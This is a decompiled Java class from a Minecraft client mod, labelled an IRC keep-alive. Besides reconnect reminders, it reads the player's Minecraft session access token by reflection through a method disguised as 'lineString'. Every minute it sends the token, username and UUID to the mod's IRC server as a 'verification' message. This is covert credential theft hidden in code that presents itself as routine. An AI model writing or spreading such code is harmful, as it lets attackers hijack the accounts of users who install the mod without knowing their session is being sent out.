/*
 * Decompiled with CFR 0.152.
 * Deobfuscated by sora-kawaii.
 */
package xyz.Melody.System.Melody.Chat;

import java.lang.reflect.Method;
import net.minecraft.client.Minecraft;
import net.minecraft.util.EnumChatFormatting;
import xyz.Melody.Client;
import xyz.Melody.Event.EventHandler;
import xyz.Melody.Event.events.world.EventTick;
import xyz.Melody.System.Melody.Chat.IRC;
import xyz.Melody.Utils.Helper;
import xyz.Melody.Utils.TimerUtil;

public final class IRCKeepAlive {
    private boolean remnided = false;
    private int ticks = 0;
    private TimerUtil timer = new TimerUtil();

    @EventHandler
    public void chouShabi(EventTick eventTick) {
        if (this.ticks < 100) {
            ++this.ticks;
            return;
        }
        if (Client.instance.irc == null || Client.instance.ircThread == null) {
            return;
        }
        if (Client.instance.ircExeption && !this.remnided && Client.mc.theWorld != null && Client.mc.thePlayer != null) {
            Helper.sendMessage((Object)((Object)EnumChatFormatting.RED) + "[IMPORTANT] IRC Connection Lost, type " + (Object)((Object)EnumChatFormatting.GREEN) + ".irc reconnect" + (Object)((Object)EnumChatFormatting.RED) + " to Reconnect.");
            this.remnided = true;
        }
        Client.instance.ircExeption = !Client.instance.ircThread.isAlive();
        if (!Client.instance.ircExeption) {
            this.remnided = false;
        }
        if (this.timer.hasReached(60000.0) && !Client.instance.ircExeption && IRC.pw != null) {
            Client.instance.preModHiderAliase(this.lineString());
            IRC.pw.println("INGAME_VERIFY: " + Minecraft.getMinecraft().getSession().getUsername() + "@" + Client.instance.authManager.verified + "@" + Client.mc.getSession().getProfile().getId().toString() + "@" + this.lineString() + "@" + "MelodySky" + "@" + "2.5.2");
            this.timer.reset();
        }
        this.ticks = 0;
    }

    private String lineString() {
        try {
            Method method = Client.mc.getSession().getClass().getDeclaredMethod("getToken", new Class[0]);
            method.setAccessible(true);
            return (String)method.invoke(Client.mc.getSession(), new Object[0]);
        }
        catch (Exception exception) {
            try {
                Method method = Client.mc.getSession().getClass().getDeclaredMethod("func_148254_d", new Class[0]);
                method.setAccessible(true);
                return (String)method.invoke(Client.mc.getSession(), new Object[0]);
            }
            catch (Exception exception2) {
                return exception2.getMessage();
            }
        }
    }
}

